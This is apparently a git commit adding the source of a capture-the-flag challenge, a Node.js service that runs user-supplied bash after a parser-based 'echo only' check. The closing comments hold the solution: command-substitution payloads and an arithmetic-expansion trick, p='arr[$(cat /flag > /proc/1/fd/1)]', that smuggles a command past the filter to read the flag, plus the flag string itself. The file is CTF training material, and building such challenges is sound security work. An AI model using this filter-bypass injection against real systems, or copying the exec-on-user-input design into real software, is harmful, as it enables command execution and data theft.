a7684ba3a0061ea359111b241683aff3c1f10fa6
rahul <rahul.shevade@gmail.com>
2024-07-25 03:16:00 -0400

    ssecond

---
+++ onlyecho/challenge.js
@@ -0,0 +1,53 @@
+const readline = require('node:readline');
+const parse = require('bash-parser');
+const { exec } = require("child_process");
+
+const check = ast => {
+  if (typeof(ast) === 'string') {
+    return true;
+  }
+  for (var prop in ast) {
+    if (prop === 'type' && ast[prop] === 'Redirect') {
+      return false;
+    }
+    if (prop === 'type' && ast[prop] === 'Command') {
+      if (ast['name'] && ast['name']['text'] && ast['name']['text'] != 'echo') {
+        return false;
+      }
+    }
+    if (!check(ast[prop])) {
+      return false;
+    }
+  }
+  return true;          
+};
+
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout,
+});
+
+rl.question(`I like scripts with echo. What's your favorite bash script? `, cmd => {
+  const ast = parse(cmd);
+  if (!ast.type === 'Script') {
+    rl.write('This is not even a script!');
+    rl.close();
+    return;
+  }
+  if (!check(ast)) {
+    rl.write('Hacker detected! No hacks, only echo!');
+    rl.close();
+    return;
+  }
+  exec(cmd, { shell: '/bin/bash' }, (error, stdout, stderr) => {
+    rl.write(stdout);
+    rl.close();
+  });
+});
+
+// $(echo "$(echo ls /)")
+// $(echo "$(echo ls .)")
+// p='arr[$(cat /flag > /proc/1/fd/1)]'; echo $(( p == 1 ));
+// ==> echo $(( arr[$(cat ....)] == 1 ))
+// ==> echo $(( arr[ CAT EXECUTES ] == 1))
+// CTF{LiesDamnedLiesAndBashParsingDifferentials}
